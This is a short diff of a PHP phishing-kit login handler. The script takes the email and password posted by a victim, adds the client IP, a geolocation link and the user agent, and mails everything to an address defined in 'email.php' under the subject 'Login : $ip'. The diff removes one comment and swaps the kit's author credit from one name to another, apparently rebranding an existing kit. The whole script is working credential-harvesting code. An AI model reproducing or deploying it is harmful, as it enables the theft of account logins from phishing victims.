@@ -1,7 +1,6 @@
 <?php
 include 'email.php';
 $email = trim($_POST['ai']);
-//Congrats! you are on the right direction...
 $password = trim($_POST['pr']);
 if($email != null && $password != null){
 	$ip = getenv("REMOTE_ADDR");
@@ -15,7 +14,7 @@ if($email != null && $password != null){
 	$message .= "|Client IP: ".$ip."\n";
 	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 	$message .= "User Agent : ".$useragent."\n";
-	$message .= "|----------- CrEaTeD bY Chyevus --------------|\n";
+	$message .= "|----------- CrEaTeD bY Lurd Azeez --------------|\n";
 	$send = $Receive_email;
 	$subject = "Login : $ip";
     mail($send, $subject, $message);   
